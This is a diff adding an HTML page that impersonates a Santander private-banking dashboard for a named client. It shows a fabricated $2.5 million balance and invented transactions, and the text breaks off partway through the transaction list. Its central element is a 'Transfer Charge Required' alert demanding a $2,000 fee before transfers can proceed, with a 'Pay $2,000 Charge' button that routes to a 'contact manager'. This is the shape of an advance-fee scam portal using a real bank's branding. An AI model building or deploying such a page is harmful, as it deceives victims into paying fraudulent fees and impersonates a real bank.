@@ -1,0 +1,1292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Santander · Client Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ----- reset & base ----- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f8f9fc;
+      color: #1a1a1a;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+    }
+    .mono { font-variant-numeric: tabular-nums; }
+    a { color: inherit; text-decoration: none; }
+    ul { list-style: none; }
+    button { font-family: inherit; cursor: pointer; }
+
+    .app { display: grid; grid-template-columns: 260px 1fr; min-height: 100vh; }
+
+    /* ----- sidebar ----- */
+    .sidebar {
+      background: #fff; padding: 28px 20px; display: flex; flex-direction: column;
+      gap: 2px; border-right: 1px solid #f0f0f0; position: sticky; top: 0;
+      height: 100vh; overflow-y: auto; box-shadow: 2px 0 12px rgba(0,0,0,0.02);
+    }
+    .brand { display: flex; align-items: center; gap: 14px; padding: 0 4px 26px; color: #1a1a1a; cursor: pointer; }
+    .brand-logo-wrap {
+      position: relative; width: 52px; height: 52px; display: flex;
+      align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .brand-logo-wrap::before, .brand-logo-wrap::after {
+      content: ''; position: absolute; border-radius: 50%;
+      border: 1.5px solid rgba(236, 0, 0, 0.25); transition: all 0.35s ease;
+    }
+    .brand-logo-wrap::before { width: 52px; height: 52px; border-color: rgba(236, 0, 0, 0.18); }
+    .brand-logo-wrap::after { width: 66px; height: 66px; border-color: rgba(236, 0, 0, 0.10); }
+    .brand:hover .brand-logo-wrap::before { width: 60px; height: 60px; border-color: rgba(236, 0, 0, 0.30); }
+    .brand:hover .brand-logo-wrap::after { width: 78px; height: 78px; border-color: rgba(236, 0, 0, 0.16); }
+    .brand-mark {
+      position: relative; z-index: 2; width: 40px; height: 40px; background: #ec0000;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-weight: 700; font-size: 20px; color: #fff; transition: transform 0.3s;
+    }
+    .brand:hover .brand-mark { transform: scale(1.06); }
+    .brand-name { font-weight: 800; font-size: 23px; letter-spacing: -0.5px; line-height: 1.1; }
+    .brand-tag {
+      font-size: 9px; letter-spacing: 1.6px; color: #9a9a9a; font-weight: 600;
+      display: block; margin-top: 2px;
+    }
+    .nav-group-label {
+      font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase;
+      color: #9a9a9a; font-weight: 700; padding: 20px 12px 8px;
+    }
+    .nav-item {
+      display: flex; align-items: center; gap: 14px; padding: 11px 12px;
+      border-radius: 12px; font-size: 14px; font-weight: 500; color: #4a4a4a;
+      transition: all 0.22s ease; cursor: pointer;
+    }
+    .nav-item i { width: 20px; font-size: 16px; color: #9a9a9a; transition: color 0.22s; text-align: center; }
+    .nav-item:hover { background: #fff5f5; color: #ec0000; }
+    .nav-item:hover i { color: #ec0000; }
+    .nav-item.active { background: #fff0f0; color: #ec0000; font-weight: 600; }
+    .nav-item.active i { color: #ec0000; }
+    .sidebar-footer {
+      margin-top: auto; padding-top: 20px; border-top: 1px solid #f0f0f0;
+      display: flex; align-items: center; gap: 12px; font-size: 12px; color: #9a9a9a;
+    }
+    .avatar-dot {
+      width: 42px; height: 42px; border-radius: 50%; background: #ec0000; color: #fff;
+      display: flex; align-items: center; justify-content: center; font-weight: 700;
+      font-size: 15px; flex-shrink: 0;
+    }
+    .sidebar-footer div span { display: block; color: #1a1a1a; font-weight: 600; font-size: 14px; }
+
+    /* ----- main area ----- */
+    .main { padding: 0 40px 0; background: #f8f9fc; display: flex; flex-direction: column; }
+
+    /* ----- top bar ----- */
+    .topbar {
+      display: flex; justify-content: space-between; align-items: center;
+      margin: 0 -40px 28px; padding: 16px 40px; background: #fff;
+      border-bottom: 1px solid #f0f0f0; box-shadow: 0 2px 12px rgba(0,0,0,0.02);
+      position: sticky; top: 0; z-index: 50;
+    }
+    .topbar-left { display: flex; align-items: center; gap: 16px; }
+    .topbar-brand { display: flex; align-items: center; gap: 12px; cursor: pointer; }
+    .topbar-logo-wrap {
+      position: relative; width: 40px; height: 40px; display: flex;
+      align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .topbar-logo-wrap::before, .topbar-logo-wrap::after {
+      content: ''; position: absolute; border-radius: 50%;
+      border: 1.2px solid rgba(236, 0, 0, 0.18); transition: all 0.35s ease;
+    }
+    .topbar-logo-wrap::before { width: 40px; height: 40px; border-color: rgba(236, 0, 0, 0.16); }
+    .topbar-logo-wrap::after { width: 52px; height: 52px; border-color: rgba(236, 0, 0, 0.09); }
+    .topbar-brand:hover .topbar-logo-wrap::before { width: 48px; height: 48px; border-color: rgba(236, 0, 0, 0.28); }
+    .topbar-brand:hover .topbar-logo-wrap::after { width: 62px; height: 62px; border-color: rgba(236, 0, 0, 0.14); }
+    .topbar-brand-mark {
+      position: relative; z-index: 2; width: 32px; height: 32px; background: #ec0000;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-weight: 700; font-size: 15px; color: #fff; transition: transform 0.3s;
+    }
+    .topbar-brand:hover .topbar-brand-mark { transform: scale(1.06); }
+    .topbar-brand-text { font-size: 17px; font-weight: 800; letter-spacing: -0.4px; color: #1a1a1a; }
+    .topbar-left .divider { width: 1px; height: 26px; background: #eaeaea; }
+    .topbar-left .page-title { font-size: 18px; font-weight: 800; letter-spacing: -0.4px; color: #1a1a1a; }
+    .topbar-left .page-title span { color: #ec0000; }
+    .topbar-left .page-sub { font-size: 12px; color: #6a6a6a; font-weight: 500; }
+    .topbar-right { display: flex; align-items: center; gap: 14px; }
+    .topbar-right .user-chip {
+      display: flex; align-items: center; gap: 10px; padding: 6px 16px 6px 6px;
+      background: #fafafa; border: 1px solid #f0f0f0; border-radius: 60px; cursor: default;
+    }
+    .topbar-right .user-chip .avatar-sm {
+      width: 32px; height: 32px; border-radius: 50%; background: #ec0000; color: #fff;
+      display: flex; align-items: center; justify-content: center; font-weight: 700;
+      font-size: 12px; flex-shrink: 0;
+    }
+    .topbar-right .user-chip .user-meta { display: flex; flex-direction: column; line-height: 1.2; }
+    .topbar-right .user-chip .user-meta b { font-size: 13px; font-weight: 700; color: #1a1a1a; }
+    .topbar-right .user-chip .user-meta span { font-size: 10px; color: #9a9a9a; font-weight: 500; }
+    .topbar-right .btn-logout {
+      display: flex; align-items: center; gap: 7px; background: #ec0000; color: #fff;
+      border: none; padding: 9px 20px; border-radius: 60px; font-weight: 600;
+      font-size: 13px; transition: all 0.22s; box-shadow: 0 4px 14px rgba(236,0,0,0.2);
+    }
+    .topbar-right .btn-logout:hover {
+      background: #c70000; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(236,0,0,0.3);
+    }
+    .topbar-right .btn-logout i { font-size: 12px; }
+
+    /* ----- restriction alert ----- */
+    .restriction-alert {
+      background: #fff; border: 1px solid #ffe0b2; border-left: 5px solid #ec0000;
+      border-radius: 20px; padding: 24px 28px; margin-bottom: 24px; display: flex;
+      align-items: center; gap: 24px; flex-wrap: wrap; box-shadow: 0 4px 16px rgba(0,0,0,0.03);
+      transition: all 0.3s ease;
+    }
+    .restriction-alert:hover { box-shadow: 0 8px 28px rgba(236,0,0,0.06); }
+    .restriction-icon {
+      width: 56px; height: 56px; border-radius: 16px; background: #fff5e6;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .restriction-icon i { font-size: 26px; color: #ec0000; }
+    .restriction-content { flex: 1; min-width: 240px; }
+    .restriction-content h3 {
+      font-size: 17px; font-weight: 800; color: #1a1a1a; margin-bottom: 6px; letter-spacing: -0.3px;
+    }
+    .restriction-content .desc { font-size: 14px; color: #6a6a6a; line-height: 1.55; }
+    .restriction-content .desc strong { color: #ec0000; font-weight: 700; }
+    .paid-by-badge {
+      display: inline-flex; align-items: center; gap: 6px; background: #e8f5e9;
+      color: #1b7a2e; font-size: 12px; font-weight: 700; padding: 4px 12px;
+      border-radius: 40px; margin-top: 8px;
+    }
+    .restriction-progress { flex: 1; min-width: 200px; }
+    .restriction-progress .labels {
+      display: flex; justify-content: space-between; font-size: 12px;
+      color: #6a6a6a; margin-bottom: 8px; font-weight: 600;
+    }
+    .restriction-progress .labels span:last-child { color: #ec0000; font-weight: 700; }
+    .progress-track { width: 100%; height: 10px; background: #f0f0f0; border-radius: 40px; overflow: hidden; }
+    .progress-fill {
+      height: 100%; width: 0%; background: linear-gradient(90deg, #ec0000, #ff4444);
+      border-radius: 40px; transition: width 0.8s ease;
+    }
+    .restriction-actions { display: flex; gap: 12px; flex-wrap: wrap; }
+    .btn-pay-restriction {
+      background: #ec0000; color: #fff; border: none; padding: 13px 26px;
+      border-radius: 60px; font-weight: 700; font-size: 14px; transition: all 0.25s ease;
+      box-shadow: 0 4px 14px rgba(236,0,0,0.2); display: flex; align-items: center;
+      gap: 9px; cursor: pointer;
+    }
+    .btn-pay-restriction:hover {
+      background: #c70000; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(236,0,0,0.3);
+    }
+    .btn-dismiss-restriction {
+      background: #f8f9fc; color: #6a6a6a; border: 1px solid #eaeaea;
+      padding: 13px 22px; border-radius: 60px; font-weight: 600; font-size: 14px;
+      transition: all 0.25s ease; cursor: pointer;
+    }
+    .btn-dismiss-restriction:hover { background: #fff; color: #1a1a1a; border-color: #ec0000; }
+
+    /* ----- balance row ----- */
+    .balance-row { display: grid; grid-template-columns: 1.5fr 1fr 1fr; gap: 20px; margin-bottom: 24px; }
+    .card {
+      background: #fff; border: 1px solid #f0f0f0; border-radius: 20px;
+      padding: 24px 26px; transition: all 0.3s ease; box-shadow: 0 4px 16px rgba(0,0,0,0.03);
+    }
+    .card:hover { box-shadow: 0 8px 28px rgba(0,0,0,0.06); border-color: #ec0000; transform: translateY(-2px); }
+    .primary-balance {
+      background: linear-gradient(135deg, #ec0000, #b30000); border: none;
+      color: #fff; position: relative; overflow: hidden;
+    }
+    .primary-balance::after {
+      content: ''; position: absolute; right: -60px; top: -80px; width: 280px;
+      height: 280px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(255,255,255,0.08), transparent 70%);
+    }
+    .primary-balance .label {
+      font-size: 12px; color: rgba(255,255,255,0.8); letter-spacing: 0.8px;
+      margin-bottom: 10px; position: relative; z-index: 1; font-weight: 600;
+    }
+    .primary-balance .amount {
+      font-size: 38px; font-weight: 800; letter-spacing: -1px; position: relative; z-index: 1;
+    }
+    .primary-balance .amount .cents { font-size: 20px; color: rgba(255,255,255,0.7); }
+    .primary-balance .meta {
+      display: flex; gap: 24px; margin-top: 16px; font-size: 12px;
+      color: rgba(255,255,255,0.85); position: relative; z-index: 1; flex-wrap: wrap;
+    }
+    .primary-balance .meta b { color: #fff; font-weight: 700; }
+    .acct-name {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-top: 18px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.15);
+      font-size: 12px; color: rgba(255,255,255,0.85); position: relative; z-index: 1;
+    }
+    .acct-name b { color: #fff; }
+    .mini-card .label { font-size: 12px; color: #6a6a6a; margin-bottom: 8px; font-weight: 600; letter-spacing: 0.3px; }
+    .mini-card .amount { font-size: 26px; font-weight: 700; color: #1a1a1a; }
+    .new-account-tag {
+      display: inline-flex; align-items: center; gap: 6px; font-size: 12px;
+      font-weight: 600; margin-top: 10px; padding: 5px 14px; border-radius: 40px;
+      background: #f0f4ff; color: #4a5a8a;
+    }
+    .new-account-tag i { font-size: 11px; }
+
+    /* ----- grid layout ----- */
+    .grid-2 { display: grid; grid-template-columns: 1.6fr 1fr; gap: 24px; align-items: start; }
+    .section-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+    .section-title h2 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; }
+
+    /* ----- transactions ----- */
+    .tx-row {
+      display: flex; align-items: center; gap: 14px; padding: 13px 0;
+      border-bottom: 1px solid #f5f5f5;
+      transition: background 0.2s ease, transform 0.2s ease;
+      border-radius: 10px;
+    }
+    .tx-row:hover { background: #fafafa; transform: translateX(4px); }
+    .tx-row:last-child { border-bottom: none; }
+    .tx-icon {
+      width: 40px; height: 40px; border-radius: 12px; display: flex;
+      align-items: center; justify-content: center; flex-shrink: 0; font-size: 15px;
+    }
+    .tx-icon.out { background: #fff0f0; color: #ec0000; }
+    .tx-icon.in { background: #e8f5e9; color: #1b7a2e; }
+    .tx-icon.neutral { background: #f0f4ff; color: #4a5a8a; }
+    .tx-info { flex: 1; }
+    .tx-info .name { font-size: 14px; font-weight: 600; color: #1a1a1a; }
+    .tx-info .meta { font-size: 12px; color: #9a9a9a; margin-top: 2px; }
+    .tx-amount { font-size: 14px; font-weight: 700; }
+    .tx-amount.out { color: #ec0000; }
+    .tx-amount.in { color: #1b7a2e; }
+    .tx-amount.neutral { color: #4a5a8a; }
+    .tx-group-label {
+      font-size: 10px; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase;
+      color: #b0b0b0; padding: 18px 0 6px; border-bottom: 1px solid #f5f5f5;
+    }
+    .tx-group-label:first-child { padding-top: 0; }
+
+    /* ----- investments ----- */
+    .invest-item {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 13px 0; border-bottom: 1px solid #f5f5f5;
+    }
+    .invest-item:last-child { border-bottom: none; }
+    .invest-name { font-size: 14px; font-weight: 600; }
+    .invest-sub { font-size: 11px; color: #9a9a9a; margin-top: 2px; }
+    .invest-val { text-align: right; }
+    .invest-val .v { font-size: 14px; font-weight: 700; }
+    .invest-val .p { font-size: 11px; margin-top: 2px; font-weight: 700; }
+    .invest-total {
+      display: flex; justify-content: space-between; align-items: baseline;
+      padding-top: 16px; margin-top: 6px; border-top: 2px solid #fce8e8;
+    }
+    .invest-total .v { font-size: 22px; font-weight: 800; color: #ec0000; }
+
+    /* ----- transfer panel ----- */
+    .transfer-wrapper { display: flex; flex-direction: column; gap: 20px; }
+    .transfer-main-card {
+      background: #fff; border: 1px solid #f0f0f0; border-radius: 20px;
+      padding: 26px 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.03);
+    }
+    .transfer-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 22px; }
+    .transfer-header h2 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; }
+    .transfer-header .badge-new {
+      font-size: 10px; font-weight: 700; color: #ec0000; background: #fff0f0;
+      padding: 5px 13px; border-radius: 40px; letter-spacing: 0.5px;
+    }
+    .transfer-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .transfer-grid .full-width { grid-column: 1 / -1; }
+    .field-group { margin-bottom: 0; }
+    .field-group label {
+      display: block; font-size: 11px; font-weight: 700; color: #6a6a6a;
+      text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;
+    }
+
+    /* ============================================================
+       PROFESSIONAL DROPDOWNS & INPUTS
+       ============================================================ */
+    .field-group select,
+    .field-group input {
+      width: 100%;
+      padding: 13px 16px;
+      border: 1.5px solid #e4e6eb;
+      border-radius: 14px;
+      font-size: 14px;
+      font-family: inherit;
+      background: #fafbfc;
+      color: #1a1a1a;
+      outline: none;
+      transition: border-color 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    /* Custom chevron for selects */
+    .field-group select {
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236a6a6a' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 14px center;
+      background-size: 16px;
+      padding-right: 44px;
+      cursor: pointer;
+    }
+
+    .field-group select:hover,
+    .field-group input:hover {
+      border-color: #d4d7dd;
+      background: #fff;
+    }
+
+    .field-group select:focus,
+    .field-group input:focus {
+      border-color: #ec0000;
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(236, 0, 0, 0.06);
+    }
+
+    /* Style the native dropdown list */
+    .field-group select option {
+      background: #fff;
+      color: #1a1a1a;
+      padding: 12px;
+      font-size: 14px;
+    }
+    .field-group select optgroup {
+      background: #fff;
+      color: #9a9a9a;
+      font-weight: 700;
+      font-size: 11px;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      padding: 10px 8px 6px;
+      font-style: normal;
+    }
+    .field-group select optgroup option {
+      color: #1a1a1a;
+      font-weight: 500;
+      font-size: 14px;
+      letter-spacing: 0;
+      text-transform: none;
+      padding: 10px 16px;
+    }
+
+    /* Amount input */
+    .field-group .amount-wrap { position: relative; }
+    .field-group .amount-wrap span {
+      position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+      font-size: 14px; color: #6a6a6a; font-weight: 700;
+      pointer-events: none;
+    }
+    .field-group .amount-wrap input { padding-left: 34px; font-weight: 600; }
+
+    /* ============================================================
+       PROFESSIONAL TRANSFER TYPE SELECTOR (segmented control)
+       ============================================================ */
+    .transfer-type-selector {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      background: #f4f5f7;
+      border-radius: 14px;
+      padding: 5px;
+      border: 1px solid #e4e6eb;
+    }
+    .transfer-type-selector input[type="radio"] {
+      display: none;
+    }
+    .transfer-type-selector label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #6a6a6a;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      text-transform: none;
+      letter-spacing: 0;
+      margin: 0;
+      user-select: none;
+    }
+    .transfer-type-selector label i {
+      font-size: 13px;
+      opacity: 0.7;
+      transition: opacity 0.2s;
+    }
+    .transfer-type-selector label:hover {
+      color: #1a1a1a;
+      background: rgba(255,255,255,0.5);
+    }
+    .transfer-type-selector input[type="radio"]:checked + label {
+      background: #fff;
+      color: #ec0000;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    .transfer-type-selector input[type="radio"]:checked + label i {
+      opacity: 1;
+    }
+
+    .fee-modern {
+      background: #fafafa; border: 1px solid #f0f0f0; border-radius: 14px;
+      padding: 16px 18px; margin: 16px 0 18px;
+    }
+    .fee-modern .fee-row { display: flex; justify-content: space-between; padding: 5px 0; font-size: 13px; color: #6a6a6a; }
+    .fee-modern .fee-row .label { display: flex; align-items: center; gap: 8px; }
+    .fee-modern .fee-row .label i { font-size: 11px; color: #9a9a9a; }
+    .fee-modern .fee-row .value { font-weight: 600; color: #1a1a1a; }
+    .fee-modern .fee-row.total {
+      border-top: 1px solid #eaeaea; margin-top: 6px; padding-top: 12px;
+      font-weight: 800; color: #1a1a1a; font-size: 15px;
+    }
+    .fee-modern .fee-row.total .value { color: #ec0000; }
+    .fee-note-modern { font-size: 11px; color: #9a9a9a; margin-top: 10px; line-height: 1.5; padding: 0 2px; }
+    .fee-note-modern i { color: #ec0000; margin-right: 6px; }
+    .btn-transfer {
+      width: 100%; background: #ec0000; color: #fff; border: none; padding: 15px;
+      border-radius: 60px; font-weight: 700; font-size: 15px; transition: all 0.25s ease;
+      box-shadow: 0 6px 18px rgba(236,0,0,0.2); display: flex;
+      align-items: center; justify-content: center; gap: 10px;
+    }
+    .btn-transfer:hover { background: #c70000; transform: translateY(-2px); box-shadow: 0 10px 28px rgba(236,0,0,0.3); }
+    .btn-transfer i { font-size: 14px; }
+    .domestic-fields { grid-column: 1 / -1; }
+    .domestic-fields.hidden { display: none; }
+    .other-bank-row { display: none; grid-column: 1 / -1; }
+    .other-bank-row.visible { display: block; }
+
+    /* ----- footer ----- */
+    .dashboard-footer {
+      background: #1a1a1a; color: #ccc; padding: 48px 40px 32px;
+      margin-top: 48px; border-top: 4px solid #ec0000;
+    }
+    .dashboard-footer .footer-grid {
+      display: grid; grid-template-columns: 1.2fr 1fr 1fr; gap: 40px;
+      padding-bottom: 32px; border-bottom: 1px solid #333;
+    }
+    .dashboard-footer h4 { color: #fff; font-size: 16px; font-weight: 700; margin-bottom: 16px; }
+    .dashboard-footer p { font-size: 14px; line-height: 1.6; max-width: 320px; }
+    .dashboard-footer .contact-block { display: flex; flex-direction: column; gap: 8px; font-size: 14px; }
+    .dashboard-footer .contact-block span { display: flex; align-items: center; gap: 10px; color: #ccc; }
+    .dashboard-footer .contact-block i { color: #ec0000; width: 18px; text-align: center; }
+    .dashboard-footer .badge-list { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 8px; }
+    .dashboard-footer .badge-list span {
+      background: #2a2a2a; color: #ddd; padding: 6px 16px; border-radius: 40px;
+      font-size: 12px; font-weight: 600; display: inline-flex; align-items: center; gap: 6px;
+    }
+    .dashboard-footer .badge-list span i { color: #ec0000; }
+    .dashboard-footer .bottom { text-align: center; font-size: 13px; color: #777; padding-top: 24px; }
+    .dashboard-footer .bottom span { color: #ec0000; }
+
+    /* ----- responsive ----- */
+    @media (max-width: 1100px) {
+      .app { grid-template-columns: 1fr; }
+      .sidebar { display: none; }
+      .balance-row { grid-template-columns: 1fr; }
+      .grid-2 { grid-template-columns: 1fr; }
+      .main { padding: 0 24px 0; }
+      .topbar { margin: 0 -24px 24px; padding: 14px 24px; }
+      .transfer-grid { grid-template-columns: 1fr; }
+      .transfer-grid .full-width { grid-column: 1; }
+      .restriction-alert { flex-direction: column; align-items: stretch; }
+      .restriction-icon { margin: 0 auto; }
+      .restriction-actions { justify-content: center; }
+      .dashboard-footer { padding: 40px 24px 28px; }
+      .dashboard-footer .footer-grid { grid-template-columns: 1fr 1fr; }
+    }
+    @media (max-width: 700px) {
+      .topbar { flex-direction: column; align-items: flex-start; gap: 12px; padding: 14px 16px; }
+      .topbar-right { width: 100%; justify-content: space-between; }
+      .topbar-left .page-title { font-size: 16px; }
+      .topbar-left .divider { display: none; }
+      .topbar-left .page-sub { display: none; }
+      .topbar-brand-text { font-size: 15px; }
+      .topbar-right .user-chip .user-meta { display: none; }
+      .topbar-right .user-chip { padding: 5px; }
+      .primary-balance .amount { font-size: 30px; }
+      .main { padding: 0 16px 0; }
+      .topbar { margin: 0 -16px 20px; }
+      .transfer-main-card { padding: 20px 16px; }
+      .restriction-alert { padding: 18px 16px; }
+      .restriction-content h3 { font-size: 16px; }
+      .dashboard-footer { padding: 32px 16px 24px; }
+      .dashboard-footer .footer-grid { grid-template-columns: 1fr; gap: 28px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app">
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="brand" onclick="window.location.href='index.html'">
+        <div class="brand-logo-wrap">
+          <div class="brand-mark">S</div>
+        </div>
+        <div>
+          <div class="brand-name">Santander</div>
+          <span class="brand-tag">US · PRIVATE CLIENT</span>
+        </div>
+      </div>
+
+      <div class="nav-group-label">Overview</div>
+      <div class="nav-item active" data-target="top" onclick="navigateSidebar(this, 'top')"><i class="fas fa-th-large"></i> Dashboard</div>
+      <div class="nav-item" data-target="accountsSection" onclick="navigateSidebar(this, 'accountsSection')"><i class="fas fa-wallet"></i> Accounts</div>
+      <div class="nav-item" data-target="transfersSection" onclick="navigateSidebar(this, 'transfersSection')"><i class="fas fa-exchange-alt"></i> Transfers</div>
+      <div class="nav-item" data-target="investmentsSection" onclick="navigateSidebar(this, 'investmentsSection')"><i class="fas fa-chart-line"></i> Investments</div>
+
+      <div class="sidebar-footer">
+        <div class="avatar-dot">CJ</div>
+        <div>
+          <span>Chad Jacobs</span>
+          Client ID · PB-77421
+        </div>
+      </div>
+    </aside>
+
+    <!-- Main -->
+    <main class="main">
+
+      <div class="topbar">
+        <div class="topbar-left">
+          <div class="topbar-brand" onclick="window.location.href='index.html'">
+            <div class="topbar-logo-wrap">
+              <div class="topbar-brand-mark">S</div>
+            </div>
+            <span class="topbar-brand-text">Santander</span>
+          </div>
+          <div class="divider"></div>
+          <div class="page-title">Dashboard<span>.</span></div>
+          <div class="page-sub">Private banking</div>
+        </div>
+        <div class="topbar-right">
+          <div class="user-chip">
+            <div class="avatar-sm">CJ</div>
+            <div class="user-meta">
+              <b>Chad Jacobs</b>
+              <span>PB-77421</span>
+            </div>
+          </div>
+          <button class="btn-logout" onclick="window.location.href='index.html'">
+            <i class="fas fa-sign-out-alt"></i> Log out
+          </button>
+        </div>
+      </div>
+
+      <div class="restriction-alert" id="restrictionAlert">
+        <div class="restriction-icon">
+          <i class="fas fa-exclamation-triangle"></i>
+        </div>
+        <div class="restriction-content">
+          <h3>Transfer Charge Required</h3>
+          <p class="desc">
+            A <strong>$2,000.00</strong> charge must be paid to complete transfers from your account.
+            <span class="paid-by-badge"><i class="fas fa-check-circle"></i> $0.00 paid so far</span>
+            <br>
+            <span style="color:#6a6a6a;font-size:13px;display:block;margin-top:6px;">
+              Required: <strong style="color:#ec0000;">$2,000.00</strong> &nbsp;·&nbsp; Paid: <strong style="color:#1b7a2e;">$0.00</strong> &nbsp;·&nbsp; Remaining: <strong style="color:#ec0000;">$2,000.00</strong>
+            </span>
+          </p>
+        </div>
+        <div class="restriction-progress">
+          <div class="labels">
+            <span>Progress</span>
+            <span>0%</span>
+          </div>
+          <div class="progress-track">
+            <div class="progress-fill"></div>
+          </div>
+        </div>
+        <div class="restriction-actions">
+          <button class="btn-pay-restriction" onclick="showContactManager()">
+            <i class="fas fa-lock-open"></i> Pay $2,000 Charge
+          </button>
+          <button class="btn-dismiss-restriction" onclick="dismissRestriction()">Dismiss</button>
+        </div>
+      </div>
+
+      <div class="balance-row" id="accountsSection">
+        <div class="card primary-balance">
+          <div class="label">TOTAL AVAILABLE BALANCE</div>
+          <div class="amount">$<span id="bal-int">2,500,000</span><span class="cents">.00</span></div>
+          <div class="meta">
+            <span>Current: <b>$1,900,000.00</b></span>
+            <span>Savings: <b>$600,000.00</b></span>
+          </div>
+          <div class="acct-name">
+            <span>Account holder</span>
+            <b>Chad Jacobs</b>
+          </div>
+        </div>
+        <div class="card mini-card">
+          <div class="label">INCOME (30 DAYS)</div>
+          <div class="amount mono">$42,350.00</div>
+          <span class="new-account-tag" style="background:#e8f5e9;color:#1b7a2e;"><i class="fas fa-arrow-up"></i> +8.4% vs last month</span>
+        </div>
+        <div class="card mini-card">
+          <div class="label">ACCOUNT STATUS</div>
+          <div class="amount" style="font-size:20px;color:#1b7a2e;">Active</div>
+          <span class="new-account-tag"><i class="fas fa-check-circle"></i> Verified · 2FA enabled</span>
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <div>
+          <div class="card">
+            <div class="section-title">
+              <h2>Recent Transactions</h2>
+              <span style="font-size:12px;color:#9a9a9a;font-weight:600;">Last 30 days</span>
+            </div>
+
+            <div class="tx-group-label">Today</div>
+
+            <div class="tx-row">
+              <div class="tx-icon in"><i class="fas fa-arrow-down"></i></div>
+              <div class="tx-info">
+                <div class="name">Salary — Meridian Corp.</div>
+                <div class="meta">Direct deposit · 08:14 AM</div>
+              </div>
+              <div class="tx-amount in">+$12,500.00</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon out"><i class="fas fa-utensils"></i></div>
+              <div class="tx-info">
+                <div class="name">The Ivy Brasserie</div>
+                <div class="meta">Card ending ····8823 · 12:42 PM</div>
+              </div>
+              <div class="tx-amount out">−$186.40</div>
+            </div>
+
+            <div class="tx-group-label">Yesterday</div>
+
+            <div class="tx-row">
+              <div class="tx-icon out"><i class="fas fa-bag-shopping"></i></div>
+              <div class="tx-info">
+                <div class="name">Whole Foods Market</div>
+                <div class="meta">Card ending ····8823 · 6:18 PM</div>
+              </div>
+              <div class="tx-amount out">−$242.75</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon in"><i class="fas fa-chart-line"></i></div>
+              <div class="tx-info">
+                <div class="name">Meridian Growth Fund — Dividend</div>
+                <div class="meta">Portfolio income · 9:00 AM</div>
+              </div>
+              <div class="tx-amount in">+$3,240.00</div>
+            </div>
+
+            <div class="tx-group-label">This Week</div>
+
+            <div class="tx-row">
+              <div class="tx-icon out"><i class="fas fa-house"></i></div>
+              <div class="tx-info">
+                <div class="name">Mortgage Payment — First Horizon</div>
+                <div class="meta">Scheduled transfer · Mon 10:00 AM</div>
+              </div>
+              <div class="tx-amount out">−$4,850.00</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon neutral"><i class="fas fa-arrows-rotate"></i></div>
+              <div class="tx-info">
+                <div class="name">Transfer to Savings ····4451</div>
+                <div class="meta">Internal transfer · Mon 9:12 AM</div>
+              </div>
+              <div class="tx-amount neutral">$10,000.00</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon out"><i class="fas fa-car"></i></div>
+              <div class="tx-info">
+                <div class="name">Shell Station — Fuel</div>
+                <div class="meta">Card ending ····8823 · Sun 7:45 PM</div>
+              </div>
+              <div class="tx-amount out">−$68.20</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon in"><i class="fas fa-briefcase"></i></div>
+              <div class="tx-info">
+                <div class="name">Consulting Fee — Whitaker &amp; Co.</div>
+                <div class="meta">Incoming wire · Sun 11:20 AM</div>
+              </div>
+              <div class="tx-amount in">+$8,750.00</div>
+            </div>
+
+            <div class="tx-group-label">Earlier</div>
+
+            <div class="tx-row">
